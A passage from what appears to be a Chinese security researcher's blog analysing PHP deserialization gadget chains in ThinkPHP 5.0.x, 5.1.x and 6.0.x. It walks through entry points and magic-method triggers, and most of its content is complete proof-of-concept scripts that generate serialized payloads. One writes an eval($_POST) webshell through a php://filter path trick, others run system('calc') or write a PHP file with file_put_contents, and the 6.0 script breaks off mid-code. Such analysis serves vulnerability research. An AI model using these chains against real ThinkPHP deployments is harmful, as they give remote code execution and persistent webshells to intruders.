/></p><p>运用到TP上filter的位置就不能放payload了，TP会直接抛出异常，因此需要改一下payload的位置</p><p><code>php://filter/convert.iconv.utf-8.utf-7|convert.base64-decode/resource=1PD9waHAgQGV2YWwoJF9QT1NUWydhJ10pOz8+/../nb.php</code></p><p>PD9waHAgQGV2YWwoJF9QT1NUWydhJ10pOz8+，正常的base64的payload是这样的，实际情况要根据前面的字符数量，在payload的前面增加字符做填充，这样才能让最终base64解码的时候刚好解码到这个地方。</p><p>看回源码，这里的filename参数是可控的，因此理论上应该可以绕过死亡exit</p><p><img src="../../../typora-user-images/image-20240912112341564.png" alt="image-20240912112341564" /></p><h3 id="三-poc编写"><a class="markdownIt-Anchor" href="#三-poc编写"></a> 三、POC编写</h3><p>写poc注意一下ThinkPHP的命名空间</p><p>Thinkphp命名空间实际上也很好理解，可以理解成一个模块化的定义。A模块的方法调用B模块里面的方法，带着模块名访问初始化就可以了。</p><p>先按照上面分析的思路编写一个poc:</p><pre class="line-numbers language-PHP" data-language="PHP"><code class="language-PHP">&lt;?phpnamespace think\process\pipes&#123;class Windows&#123;private $files &#x3D; [];function __construct($a)&#123;$this-&gt;files &#x3D; [$a];&#125;&#125;&#125;&#x2F;&#x2F; Windows类，入口反序列化触发toString&#x2F;&#x2F;Pivot类，Model类的子类，触发__call方法namespace think\model&#123;class Pivot&#123;protected $append &#x3D; [&quot;1&quot;&#x3D;&gt;&quot;getError&quot;];protected $error;protected $parent;function __construct($a,$b)&#123;$this-&gt;error &#x3D; $a;$this-&gt;parent &#x3D; $b;&#125;&#125;&#125;&#x2F;&#x2F; HasOne类，Relation类的子类，触发if条件需要namespace think\model\relation&#123;class HasOne&#123;protected $selfRelation &#x3D; false;protected $query;protected $bindAttr &#x3D; [&#39;1&#39;&#x3D;&gt;1];function __construct($a)&#123;$this-&gt;query &#x3D; $a;&#125;&#125;&#125;&#x2F;&#x2F; Query类，为了符合上面的getModel条件namespace think\db&#123;class Query&#123;protected $model;function __construct($a)&#123;$this-&gt;model &#x3D; $a;&#125;&#125;&#125;&#x2F;&#x2F; __call方法触发类namespace think\console&#123;class Output&#123;protected $styles &#x3D; [&quot;getAttr&quot;];private $handle;function __construct($a)&#123;$this-&gt;handle &#x3D; $a;&#125;&#125;&#125;namespace think\session\driver&#123;class Memcached&#123;protected $handler;function __construct($a)&#123;$this-&gt;handler &#x3D; $a;&#125;&#125;&#125;namespace think\cache\driver&#123;class File&#123;protected $options &#x3D; [&#39;path&#39; &#x3D;&gt; &#39;&#39;, &#x2F;&#x2F; 这里是filename部分&#39;expire&#39; &#x3D;&gt; &#39;0&#39;,&#39;cache_subdir&#39; &#x3D;&gt; &#39;0&#39;,&#39;prefix&#39; &#x3D;&gt; &#39;0&#39;,&#39;data_compress&#39; &#x3D;&gt; false];&#125;&#125;namespace&#123;$fileObj &#x3D; new \think\cache\driver\File();$memObj &#x3D; new \think\session\driver\Memcached($fileObj);$outputObj &#x3D; new \think\console\Output($memObj);$queryObj &#x3D; new \think\db\Query($outputObj);$hasoneObj &#x3D; new think\model\relation\HasOne($queryObj);$pivotObj &#x3D; new think\model\Pivot($hasoneObj, $outputObj);$windows &#x3D; new think\process\pipes\Windows($pivotObj);echo base64_encode(serialize($windows));&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>debug看一下，成功控制filename部分，接下来就是content部分，看一下是否可控了：</p><p><img src="../../../typora-user-images/image-20240913102139582.png" alt="image-20240913102139582" /></p><p>发现最初调set的时候，参数内容就不可控，写死为了true</p><p><img src="../../../typora-user-images/image-20240913103110896.png" alt="image-20240913103110896" /></p><p>没办法，只能尝试寻找其他调用set方法的地方，且set方法的参数value部分可控。</p><p>在下面的操作逻辑中，刚好有一处调用set方法的地方，分析一下value参数，发现就是传入的参数，也就是filename。</p><p><img src="../../../typora-user-images/image-20240913104405600.png" alt="image-20240913104405600" /></p><p>因此我们实际上得到了一个filename和content存在相同变量的死亡exit场景。</p><p>这个场景我们上面讨论过了，因此修改一下exp：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>process<span class="token punctuation">\</span>pipes</span><span class="token punctuation">&#123;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Windows</span><span class="token punctuation">&#123;</span><span class="token keyword">private</span> <span class="token variable">$files</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">files</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token variable">$a</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">// Windows类，入口反序列化触发toString</span><span class="token comment">//Pivot类，Model类的子类，触发__call方法</span><span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>model</span><span class="token punctuation">&#123;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Pivot</span><span class="token punctuation">&#123;</span><span class="token keyword">protected</span> <span class="token variable">$append</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string double-quoted-string">"1"</span><span class="token operator">=></span><span class="token string double-quoted-string">"getError"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">protected</span> <span class="token variable">$error</span><span class="token punctuation">;</span><span class="token keyword">protected</span> <span class="token variable">$parent</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">error</span> <span class="token operator">=</span> <span class="token variable">$a</span><span class="token punctuation">;</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">parent</span> <span class="token operator">=</span> <span class="token variable">$b</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">// HasOne类，Relation类的子类，触发if条件需要</span><span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>model<span class="token punctuation">\</span>relation</span><span class="token punctuation">&#123;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">HasOne</span><span class="token punctuation">&#123;</span><span class="token keyword">protected</span> <span class="token variable">$selfRelation</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span><span class="token keyword">protected</span> <span class="token variable">$query</span><span class="token punctuation">;</span><span class="token keyword">protected</span> <span class="token variable">$bindAttr</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string single-quoted-string">'1'</span><span class="token operator">=></span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">query</span> <span class="token operator">=</span> <span class="token variable">$a</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">// Query类，为了符合上面的getModel条件</span><span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>db</span><span class="token punctuation">&#123;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Query</span><span class="token punctuation">&#123;</span><span class="token keyword">protected</span> <span class="token variable">$model</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">model</span> <span class="token operator">=</span> <span class="token variable">$a</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">// __call方法触发类</span><span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>console</span><span class="token punctuation">&#123;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Output</span><span class="token punctuation">&#123;</span><span class="token keyword">protected</span> <span class="token variable">$styles</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string double-quoted-string">"getAttr"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">private</span> <span class="token variable">$handle</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">handle</span> <span class="token operator">=</span> <span class="token variable">$a</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>session<span class="token punctuation">\</span>driver</span><span class="token punctuation">&#123;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Memcached</span><span class="token punctuation">&#123;</span><span class="token keyword">protected</span> <span class="token variable">$handler</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">handler</span> <span class="token operator">=</span> <span class="token variable">$a</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>cache<span class="token punctuation">\</span>driver</span><span class="token punctuation">&#123;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">File</span><span class="token punctuation">&#123;</span><span class="token keyword">protected</span> <span class="token variable">$options</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string single-quoted-string">'path'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'php://filter/convert.iconv.utf-8.utf-7|convert.base64-decode/resource=111PD9waHAgQGV2YWwoJF9QT1NUWydhJ10pOz8+/../nb.php'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'expire'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'0'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'cache_subdir'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'0'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'prefix'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'0'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'data_compress'</span> <span class="token operator">=></span> <span class="token constant boolean">false</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">protected</span> <span class="token variable">$tag</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">namespace</span><span class="token punctuation">&#123;</span><span class="token variable">$fileObj</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified"><span class="token punctuation">\</span>think<span class="token punctuation">\</span>cache<span class="token punctuation">\</span>driver<span class="token punctuation">\</span>File</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$memObj</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified"><span class="token punctuation">\</span>think<span class="token punctuation">\</span>session<span class="token punctuation">\</span>driver<span class="token punctuation">\</span>Memcached</span><span class="token punctuation">(</span><span class="token variable">$fileObj</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$outputObj</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified"><span class="token punctuation">\</span>think<span class="token punctuation">\</span>console<span class="token punctuation">\</span>Output</span><span class="token punctuation">(</span><span class="token variable">$memObj</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$queryObj</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified"><span class="token punctuation">\</span>think<span class="token punctuation">\</span>db<span class="token punctuation">\</span>Query</span><span class="token punctuation">(</span><span class="token variable">$outputObj</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$hasoneObj</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified">think<span class="token punctuation">\</span>model<span class="token punctuation">\</span>relation<span class="token punctuation">\</span>HasOne</span><span class="token punctuation">(</span><span class="token variable">$queryObj</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$pivotObj</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified">think<span class="token punctuation">\</span>model<span class="token punctuation">\</span>Pivot</span><span class="token punctuation">(</span><span class="token variable">$hasoneObj</span><span class="token punctuation">,</span> <span class="token variable">$outputObj</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$windows</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified">think<span class="token punctuation">\</span>process<span class="token punctuation">\</span>pipes<span class="token punctuation">\</span>Windows</span><span class="token punctuation">(</span><span class="token variable">$pivotObj</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$windows</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>最终效果：</p><p><img src="../../../typora-user-images/image-20240913153902668.png" alt="image-20240913153902668" /></p><p><img src="../../../typora-user-images/image-20240913155426725.png" alt="image-20240913155426725" /></p><p><a href="https://github.com/Mochazz/ThinkPHP-Vuln/blob/master/ThinkPHP5/ThinkPHP5.0.X%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE.md">https://github.com/Mochazz/ThinkPHP-Vuln/blob/master/ThinkPHP5/ThinkPHP5.0.X反序列化利用链.md</a></p><p>这篇blog还提到了如果目录不允许写入文件，通过其他方法创建文件。</p><h3 id="四-其他版本的反序列化链分析"><a class="markdownIt-Anchor" href="#四-其他版本的反序列化链分析"></a> 四、其他版本的反序列化链分析</h3><p>测试发现5.0的不同小版本的函数稍微有些区别</p><p>后面有空再分析， 可以参考一下这篇文章：</p><p><a href="https://www.anquanke.com/post/id/251318#h2-1">https://www.anquanke.com/post/id/251318#h2-1</a></p><h2 id="2thinkphp-51x-反序列化"><a class="markdownIt-Anchor" href="#2thinkphp-51x-反序列化"></a> ②ThinkPHP 5.1.x 反序列化</h2><p>TP5.1的反序列化比TP5.0的要简单的不少</p><p>测试版本：5.1.37</p><h3 id="一-反序列化调通过程"><a class="markdownIt-Anchor" href="#一-反序列化调通过程"></a> 一、反序列化调通过程</h3><h4 id="1-入口点"><a class="markdownIt-Anchor" href="#1-入口点"></a> 1. 入口点</h4><p>入口寻找__destruct方法，与TP5.0相同</p><p><img src="../../../typora-user-images/image-20240914135349542.png" alt="image-20240914135349542" /></p><h4 id="2-tostring-魔术方法"><a class="markdownIt-Anchor" href="#2-tostring-魔术方法"></a> 2. ToString 魔术方法</h4><p>依旧是此方法触发tostring</p><p><img src="../../../typora-user-images/image-20240914135424121.png" alt="image-20240914135424121" /></p><h4 id="3-中途利用点"><a class="markdownIt-Anchor" href="#3-中途利用点"></a> 3. 中途利用点</h4><p>这里看一下getAttr方法</p><p><img src="../../../typora-user-images/image-20240914135839679.png" alt="image-20240914135839679" /></p><p>这里有一处函数变量</p><p><img src="../../../typora-user-images/image-20240914135922286.png" alt="image-20240914135922286" /></p><h4 id="4构造中途条件"><a class="markdownIt-Anchor" href="#4构造中途条件"></a> 4.构造中途条件</h4><p>这条函数方法的pop链的条件很好构造：</p><ol><li>toarray方法的逻辑，可以直接进入，只要赋值data就可以，就可以进入下图中的getAttr方法</li></ol><p><img src="../../../typora-user-images/image-20240914154545662.png" alt="image-20240914154545662" /></p><ol start="2"><li>if逻辑可以赋值类参数解决，看一下<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>c</mi><mi>l</mi><mi>o</mi><mi>s</mi><mi>u</mi><mi>r</mi><mi>e</mi><mi mathvariant="normal">和</mi></mrow><annotation encoding="application/x-tex">closure和</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault">c</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">o</span><span class="mord mathdefault">s</span><span class="mord mathdefault">u</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">e</span><span class="mord cjk_fallback">和</span></span></span></span>value的值如何获取即可。</li></ol><p>value是拿的data数组的name键值对应的值</p><p>closure是拿的withAttr数组的name键值对应的值</p><p><img src="../../../typora-user-images/image-20240914154708798.png" alt="image-20240914154708798" /></p><h3 id="二-poc编写"><a class="markdownIt-Anchor" href="#二-poc编写"></a> 二、POC编写</h3><p>写之前注意两个问题：</p><ul><li>PHP中函数参数超出时会忽略，因此这里我们可以理解成可以调用一个参数的函数。<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>c</mi><mi>l</mi><mi>o</mi><mi>s</mi><mi>u</mi><mi>r</mi><mi>e</mi><mo stretchy="false">(</mo></mrow><annotation encoding="application/x-tex">closure(</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">c</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">o</span><span class="mord mathdefault">s</span><span class="mord mathdefault">u</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">e</span><span class="mopen">(</span></span></span></span>value)，当然这里情况可能更好一点，因为图中的$this-&gt;data其实也是可控的。</li><li>写poc时，因为触发点的类是trait的，而use这些类的Model是抽象类，写poc时，要找子类，定义属性的时候，一定要把属性定义到抽象类里面，而不是定义在子类里面。</li></ul><pre class="line-numbers language-PHP" data-language="PHP"><code class="language-PHP">&lt;?phpnamespace think\process\pipes&#123;Class Windows&#123;private $files;function __construct($a)&#123;$this-&gt;files &#x3D; [$a];&#125;&#125;&#125;namespace think\model&#123;Class Pivot&#123;private $data &#x3D; [&#39;system&#39;&#x3D;&gt;&#39;calc&#39;];private $withAttr &#x3D; [&#39;system&#39; &#x3D;&gt; &#39;system&#39;];&#125;&#125;namespace&#123;$p &#x3D; new \think\model\Pivot();$w &#x3D; new \think\process\pipes\Windows($p);echo base64_encode(serialize($w));&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>很优美的一条链</p><p><img src="../../../typora-user-images/image-20240914155309217.png" alt="image-20240914155309217" /></p><p>如果想更实战化一点，我们可以选择调用file_put_contents方法，因为上面也分析过，这里的data也是可控的。</p><p><img src="../../../typora-user-images/image-20240914161202840.png" alt="image-20240914161202840" /></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">namespace</span> <span class="token package">think</span><span class="token punctuation">&#123;</span><span class="token keyword">abstract</span> <span class="token keyword">Class</span> <span class="token class-name-definition class-name">Model</span><span class="token punctuation">&#123;</span><span class="token keyword">private</span> <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token operator">=></span><span class="token string single-quoted-string">'914.php'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'1'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'&lt;?php phpinfo()?>'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">private</span> <span class="token variable">$withAttr</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'file_put_contents'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>process<span class="token punctuation">\</span>pipes</span><span class="token punctuation">&#123;</span><span class="token keyword">Class</span> <span class="token class-name-definition class-name">Windows</span><span class="token punctuation">&#123;</span><span class="token keyword">private</span> <span class="token variable">$files</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">files</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token variable">$a</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>model</span><span class="token punctuation">&#123;</span><span class="token keyword">use</span> <span class="token package"><span class="token punctuation">\</span>think<span class="token punctuation">\</span>Model</span><span class="token punctuation">;</span><span class="token keyword">Class</span> <span class="token class-name-definition class-name">Pivot</span> <span class="token keyword">extends</span> <span class="token class-name">Model</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">namespace</span><span class="token punctuation">&#123;</span><span class="token variable">$p</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified"><span class="token punctuation">\</span>think<span class="token punctuation">\</span>model<span class="token punctuation">\</span>Pivot</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$w</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified"><span class="token punctuation">\</span>think<span class="token punctuation">\</span>process<span class="token punctuation">\</span>pipes<span class="token punctuation">\</span>Windows</span><span class="token punctuation">(</span><span class="token variable">$p</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$w</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="三-其他反序列化链分析"><a class="markdownIt-Anchor" href="#三-其他反序列化链分析"></a> 三、其他反序列化链分析</h3><p>上面分析的链其实很简单，当然5.1还有另一个常见的链，具体如下：</p><p><a href="https://paper.seebug.org/1040/#_1">https://paper.seebug.org/1040/#_1</a></p><p>这个利用了TP的filterValue类（变量覆盖RCE那里），最终触发了callback执行，有精力再学习一下</p><h2 id="3thinkphp-52x-反序列化"><a class="markdownIt-Anchor" href="#3thinkphp-52x-反序列化"></a> ③ThinkPHP 5.2.x 反序列化</h2><p>搭建环境失败了</p><p>看一下这篇文章参考一下吧。</p><p><a href="https://github.com/Mochazz/ThinkPHP-Vuln/blob/master/ThinkPHP5/ThinkPHP5.2.X%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE.md">https://github.com/Mochazz/ThinkPHP-Vuln/blob/master/ThinkPHP5/ThinkPHP5.2.X反序列化利用链.md</a></p><p>实际上和上面分析的5.1.x的链是一样的。</p><h2 id="4-thinkphp60x-反序列化"><a class="markdownIt-Anchor" href="#4-thinkphp60x-反序列化"></a> ④ ThinkPHP6.0.x 反序列化</h2><p>tp6.0.x网上说低版本可以复用5.1.x后半部分的链接。</p><p><a href="https://xz.aliyun.com/t/12630">https://xz.aliyun.com/t/12630</a> 可以看一下这篇文章</p><p>但是本地安装发现，低版本实际上也已经patch过了，因此去找其他链</p><p><img src="../../../typora-user-images/image-20240914174452400.png" alt="image-20240914174452400" /></p><p>后面的链的测试版本6.0.1</p><h3 id="一-反序列化调通过程-2"><a class="markdownIt-Anchor" href="#一-反序列化调通过程-2"></a> 一、反序列化调通过程</h3><p>实际上发现在另一个逻辑上，也可能存在变量函数。</p><p><img src="../../../typora-user-images/image-20240914174922818.png" alt="image-20240914174922818" /></p><p>那先找toString方法触发地。</p><h4 id="1寻找tostring方法触发点"><a class="markdownIt-Anchor" href="#1寻找tostring方法触发点"></a> 1.寻找toString方法触发点</h4><p>字符串拼接触发toString方法</p><p><img src="../../../typora-user-images/image-20240914180702711.png" alt="image-20240914180702711" /></p><p>触发toString的在此处，上面最后一步的$this-&gt;db()方法。</p><p><img src="../../../typora-user-images/image-20240918143311766.png" alt="image-20240918143311766" /></p><h3 id="二-poc编写-2"><a class="markdownIt-Anchor" href="#二-poc编写-2"></a> 二、POC编写</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">namespace</span> <span class="token package">think</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">abstract</span> <span class="token keyword">class</span> <span class="token class-name-definition class-name">Model</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">private</span> <span class="token variable">$lazySave</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>        <span class="token keyword">private</span> <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">private</span> <span class="token variable">$exists</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>        <span class="token keyword">protected</span> <span class="token variable">$table</span><span class="token punctuation">;</span>        <span class="token keyword">private</span> <span class="token variable">$withAttr</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">protected</span> <span class="token variable">$json</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">protected</span> <span class="token variable">$jsonAssoc</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>                <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$obj</span><span class="token operator">=</span><span class="token string single-quoted-string">''</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">lazySave</span> <span class="token operator">=</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">data</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string single-quoted-string">'calc'</span><span class="token operator">=></span><span class="token punctuation">[</span><span class="token string single-quoted-string">'calc'</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">exists</span> <span class="token operator">=</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">table</span> <span class="token operator">=</span> <span class="token variable">$obj</span><span class="token punctuation">;</span>                <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">withAttr</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string single-quoted-string">'calc'</span><span class="token operator">=></span><span class="token punctuation">[</span><span class="token string single-quoted-string">'system'</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">json</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span 